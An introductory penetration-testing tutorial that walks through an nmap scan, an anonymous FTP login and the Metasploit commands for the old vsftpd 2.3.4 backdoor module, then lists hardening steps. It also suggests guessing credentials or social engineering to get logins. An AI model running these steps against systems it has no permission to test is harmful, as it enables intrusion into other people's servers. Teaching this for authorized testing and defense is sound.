# Simple Tutorial: Exploiting an FTP Service Protected by a Firewall

This tutorial will guide you through the basic steps to explore and exploit an FTP service protected by a firewall using Parrot OS. This is for educational purposes only; unauthorized access to systems is illegal.

## Step 1: Explore Open Ports with Nmap

### Install Nmap

If Nmap is not already installed on your Parrot OS, install it using:

```bash
sudo apt update
sudo apt install nmap
```

### Scan for Open Ports

Use Nmap to scan the target IP address for open ports:

```bash
nmap -sV <target-ip-address>
```

Replace `<target-ip-address>` with the IP address of the FTP server. This command will scan for open ports and attempt to determine the service versions.

### Example Nmap Output

You might see output like this:

```plaintext
Starting Nmap 7.91 ( https://nmap.org ) at 2024-05-28 15:00 UTC
Nmap scan report for 192.168.1.100
Host is up (0.0010s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
443/tcp  open  https       Apache httpd 2.4.29
```

## Step 2: Connect to the FTP Service

### Use FTP Command

Try connecting to the FTP server using the FTP command:

```bash
ftp <target-ip-address>
```

Replace `<target-ip-address>` with the IP address of the FTP server. If the server prompts for a username and password, you may need to try common credentials or use social engineering techniques to obtain them.

### Example FTP Command Session

```bash
ftp 192.168.1.100
Connected to 192.168.1.100.
220 (vsFTPd 3.0.3)
Name (192.168.1.100:your-username): anonymous
331 Please specify the password.
Password: 
230 Login successful.
ftp>
```

## Step 3: Exploit Vulnerabilities (if any)

### Search for Vulnerabilities

If you have discovered the version of vsftpd, you can search for known vulnerabilities. A commonly known vulnerability is the vsftpd 2.3.4 backdoor, but newer versions like 3.0.3 are more secure. Use search engines or vulnerability databases like CVE (Common Vulnerabilities and Exposures) to find relevant information.

### Example Exploit: vsftpd 2.3.4 Backdoor

This is a hypothetical example since newer versions do not have this issue. For vsftpd 2.3.4, you could use Metasploit:

1. Open Metasploit:

    ```bash
    msfconsole
    ```

2. Search for the vsftpd exploit:

    ```bash
    search vsftpd
    ```

3. Use the exploit module:

    ```bash
    use exploit/unix/ftp/vsftpd_234_backdoor
    ```

4. Set the target:

    ```bash
    set RHOST <target-ip-address>
    ```

5. Run the exploit:

    ```bash
    exploit
    ```

## Step 4: Securing Your System

### Prevent Unauthorized Access

1. **Update vsftpd**: Ensure you are running the latest version of vsftpd to avoid known vulnerabilities.
2. **Strong Passwords**: Use strong, unique passwords for all users.
3. **Limit Access**: Configure your firewall to limit access to the FTP server to trusted IP addresses only.
4. **Monitor Logs**: Regularly check system and vsftpd logs for suspicious activity.

## Summary

1. Use Nmap to scan for open ports on the target system.
2. Attempt to connect to the FTP service using the FTP command.
3. Search for and, if possible, exploit known vulnerabilities.
4. Ensure you understand the importance of securing your system against similar attacks.

**Note**: Always conduct penetration testing ethically and with permission. Unauthorized access to computer systems is illegal.